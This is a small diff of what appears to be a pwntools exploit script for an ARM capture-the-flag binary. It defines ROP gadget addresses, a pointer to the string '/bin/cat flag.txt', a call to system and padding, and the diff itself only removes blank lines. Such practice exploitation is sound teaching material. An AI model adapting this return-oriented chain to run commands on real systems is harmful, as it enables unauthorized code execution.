@@ -9,11 +9,9 @@ context.binary = BINARY
 
 p = process(BINARY)
 
-
 cat_flag             = p32(0x2103c) # "/bin/cat flag.txt"
 call_system          = p32(0x105E0) # bl system
 PADDING              = b"BBBB"
-
 
 def payload_1():
     pop_r45678_sb_sl_pc = p32(0x10644) # pop {r4, r5, r6, r7, r8, sb, sl, pc}   
